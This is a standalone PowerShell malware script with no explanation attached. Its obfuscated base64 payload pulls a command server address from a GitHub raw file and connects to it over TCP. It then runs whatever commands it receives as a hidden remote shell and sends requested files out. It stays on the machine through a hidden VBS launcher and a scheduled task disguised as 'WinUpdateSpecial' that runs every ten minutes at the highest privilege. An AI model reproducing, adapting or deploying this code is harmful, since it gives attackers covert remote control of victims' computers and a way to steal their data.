$code = @'

$encodedScript = "JGNzaGFycENvZGUgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9uczsNCg0KcHVibGljIGNsYXNzIFdlYkNvbnRlbnRHZXR0ZXINCnsNCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRNb2RpZmllZENvbnRlbnQoKQ0KICAgIHsNCiAgICAgICAgc3RyaW5nIHVybCA9ICJodHRwczovL2dpdGh1Yi5jb20vUmFkbWV4L21haW4vcmF3L3JlZnMvaGVhZHMvbWFpbi9yb20udHh0IjsNCiAgICAgDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICBIdHRwV2ViUmVxdWVzdCByZXF1ZXN0ID0gKEh0dHBXZWJSZXF1ZXN0KVdlYlJlcXVlc3QuQ3JlYXRlKHVybCk7DQogICAgICAgICAgICByZXF1ZXN0LlVzZXJBZ2VudCA9ICJNb3ppbGxhLzUuMCI7DQoNCiAgICAgICAgICAgIHVzaW5nIChIdHRwV2ViUmVzcG9uc2UgcmVzcG9uc2UgPSAoSHR0cFdlYlJlc3BvbnNlKXJlcXVlc3QuR2V0UmVzcG9uc2UoKSkNCiAgICAgICAgICAgIHVzaW5nIChTdHJlYW0gc3RyZWFtID0gcmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkNCiAgICAgICAgICAgIHVzaW5nIChTdHJlYW1SZWFkZXIgcmVhZGVyID0gbmV3IFN0cmVhbVJlYWRlcihzdHJlYW0pKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZyBjb250ZW50ID0gcmVhZGVyLlJlYWRUb0VuZCgpOw0KICAgICAgICAgICAgICAgIGNvbnRlbnQgPSBjb250ZW50LlJlcGxhY2UoIlkiLCAiLiIpOw0KICAgICAgICAgICAgICAgIGNvbnRlbnQgPSBSZWdleC5SZXBsYWNlKGNvbnRlbnQsIEAiXHMrIiwgIiIpOw0KICAgICAgICAgICAgICAgIHJldHVybiBjb250ZW50Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiBudWxsOyANCiAgICAgICAgfQ0KICAgIH0NCn0NCiJADQoNCiMgQ29tcGlsZSBhbmQgcnVuIGluIG1lbW9yeQ0KQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRjc2hhcnBDb2RlIC1MYW5ndWFnZSBDU2hhcnANCg0KIyBDYWxsIHRoZSBtZXRob2QgYW5kIG91dHB1dCB0aGUgcmVzdWx0DQokcmVzdWx0ID0gW1dlYkNvbnRlbnRHZXR0ZXJdOjpHZXRNb2RpZmllZENvbnRlbnQoKQ0KDQoNCg0KaWYgKCRyZXN1bHQgLWVxICJleGl0Iikgew0KICAgIFdyaXRlLU91dHB1dCAiZXhpdC4iDQogICAgZXhpdCAwDQp9DQplbHNlaWYgKCRyZXN1bHQgLWVxICRudWxsKSB7DQogICAgIyBDb250aW51ZSB3aXRoIHlvdXIgbm9ybWFsIG9wZXJhdGlvbnMNCiAgICBXcml0ZS1PdXRwdXQgImlzIG51bGwiDQoJZXhpdCAxDQp9DQoNCndoaWxlICgkdHJ1ZSkgew0KICAgIHRyeSB7DQogICAgICAgICR4RFZsQ3ZvTWRIZ3BYID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCRyZXN1bHQsIDQ0MykNCiAgICAgICAgaWYgKCR4RFZsQ3ZvTWRIZ3BYLkNvbm5lY3RlZCkgew0KICAgICAgICAgICAgJFZySDVRdWQwTGpBdG9oNjdBID0gJHhEVmxDdm9NZEhncFguR2V0U3RyZWFtKCkNCiAgICAgICAgICAgICR3ZkFhN0l5OEhaT1VsID0gW0RhdGVUaW1lXTo6Tm93DQoNCiAgICAgICAgICAgIHdoaWxlICgkeERWbEN2b01kSGdwWC5Db25uZWN0ZWQpIHsNCiAgICAgICAgICAgICAgICBbYnl0ZVtdXSQ2SnFYd1BHNVI0ZmN2bkNnV1MgPSAwLi42NTUzNSB8IEZvckVhY2gtT2JqZWN0IHsgMCB9ICANCiAgICAgICAgICAgICAgICAkRWR6UiA9ICRWckg1UXVkMExqQXRvaDY3QS5SZWFkKCQ2SnFYd1BHNVI0ZmN2bkNnV1MsIDAsICQ2SnFYd1BHNVI0ZmN2bkNnV1MuTGVuZ3RoKSAgIA0KDQogICAgICAgICAgICAgICAgaWYgKCRFZHpSIC1ndCAwKSB7DQogICAgICAgICAgICAgICAgICAgICR3ZkFhN0l5OEhaT1VsID0gW0RhdGVUaW1lXTo6Tm93ICANCiAgICAgICAgICAgICAgICAgICAgJER2VllEb01Xa3hpdlZtWSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkNkpxWHdQRzVSNGZjdm5DZ1dTLCAwLCAkRWR6UikgIA0KDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoJER2VllEb01Xa3hpdlZtWSAtbWF0Y2ggIl5kb3dubG9hZFxzKyguKykiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkNWdZcFpISVdPakQ0ayA9ICR4STVrclsxXQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkNWdZcFpISVdPakQ0ayAtUGF0aFR5cGUgTGVhZikgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTeG5BYnY1MW5HQTR3ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCQ1Z1lwWkhJV09qRDRrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRWckg1UXVkMExqQXRvaDY3QS5Xcml0ZSgkU3huQWJ2NTFuR0E0dywgMCwgJFN4bkFidjUxbkdBNHcuTGVuZ3RoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRWckg1UXVkMExqQXRvaDY3QS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRWckg1UXVkMExqQXRvaDY3QS5Xcml0ZShbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiRmlsZSBub3QgZm91bmQuIiksIDAsIDE0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRWckg1UXVkMExqQXRvaDY3QS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQoJCQkJCQl0cnl7DQoJICAgICAgICAgICAgICAgICAgICAgICAgJFhDa1ZmN053OHliQmNqMkQzbnZBMUhJID0gSW52b2tlLUV4cHJlc3Npb24gIi4geyAkRHZWWURvTVdreGl2Vm1ZIH0gMj4mMSIgfCBPdXQtU3RyaW5nICAgIA0KCQkJCQkJCSRBdU9UID0gJFhDa1ZmN053OHliQmNqMkQzbnZBMUhJICsgJ1BTICcgKyAoR2V0LUxvY2F0aW9uKS5QYXRoICsgJz4gJyAgICAgIA0KCQkJCQkJCSR1RFo0NUl0elVEViA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRBdU9UKSAgIA0KCQkJCQkJCSRWckg1UXVkMExqQXRvaDY3QS5Xcml0ZSgkdURaNDVJdHpVRFYsIDAsICR1RFo0NUl0elVEVi5MZW5ndGgpICAgICAgICAgICAgICAgICAgICANCgkJCQkJCQkkVnJINVF1ZDBMakF0b2g2N0EuRmx1c2goKSAJCQkJCQkNCgkJCQkJCX1jYXRjaHsNCgkJCQkJCQkkZXJyb3JNc2cgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiQ29tbWFuZCBlcnJvcjogJF9gblBTICIgKyAoR2V0LUxvY2F0aW9uKS5QYXRoICsgJz4gJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVnJINVF1ZDBMakF0b2g2N0EuV3JpdGUoJGVycm9yTXNnLCAwLCAkZXJyb3JNc2cuTGVuZ3RoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRWckg1UXVkMExqQXRvaDY3QS5GbHVzaCgpDQoJCQkJCQl9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAkQms4ZTVvID0gW0RhdGVUaW1lXTo6Tm93IC0gJHdmQWE3SXk4SFpPVWwNCiAgICAgICAgICAgICAgICBpZiAoJEJrOGU1by5Ub3RhbE1pbnV0ZXMgLWdlIDIpIHsNCiAgICAgICAgICAgICAgICAgICAgJHhEVmxDdm9NZEhncFguQ2xvc2UoKQ0KICAgICAgICAgICAgICAgICAgICBicmVhayAgDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkeERWbEN2b01kSGdwWC5DbG9zZSgpICANCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxMCAgDQogICAgfQ0KfQ0KDQo="



$encodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedScript))
Invoke-Expression $encodedScript

'@


$programsFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)

$scriptPath = Join-Path $programsFolder "Microsoft\Windows\Templates\script.ps1"


$code | Out-File -FilePath $scriptPath -Encoding ascii


$startupFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)


$batchScriptPath = Join-Path $startupFolder "Microsoft\Windows\Templates\run.vbs"
$batchCode = @"
' Create a Shell object
Set objShell = CreateObject("WScript.Shell")


WScript.Sleep 5000

' Path to the PowerShell script comons
scriptPath = "$scriptPath"


' Command to run PowerShell script in hidden mode
command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptPath & """"

' Execute the command and capture return value
returnValue = objShell.Run(command, 0, True)
"@
$batchCode | Out-File -FilePath $batchScriptPath -Encoding ascii


schtasks /Create /SC minute /MO 10 /TN "WinUpdateSpecial" /TR "wscript.exe '$batchScriptPath'" /F /RL HIGHEST





